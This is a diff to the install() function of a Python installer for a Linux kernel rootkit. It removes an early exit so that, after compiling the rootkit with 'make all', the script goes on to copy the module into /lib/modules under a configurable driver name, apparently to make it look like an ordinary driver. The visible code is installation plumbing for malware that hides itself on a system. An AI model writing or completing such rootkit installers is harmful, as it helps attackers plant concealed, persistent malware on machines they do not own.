@@ -168,13 +168,12 @@ def install(kernel_version):
 	create_config_header_file(config, config_path)
 	print_success("{} created.".format(config_path))
 
-	# TODO: Compile rootkit
+	# Compile rootkit
 	print_status("Compiling rootkit...")
 	run_cmd("make all", "./rootkit")
 	print_success("Successful compilation.")
-	sys.exit()
 
-	# TODO: Move compiled components to the right place. Maybe drop it in "/lib/modules/{0}/garden?
+	# Move compiled components to the right place. Maybe drop it in "/lib/modules/{0}/garden?
 	print_status("Installing rootkit...")
 	module_dest_path = "/lib/modules/{0}/kernel/drivers/{1}".format(kernel_version, config["DRIVER_NAME"])
 	if not os.path.exists(module_dest_path):
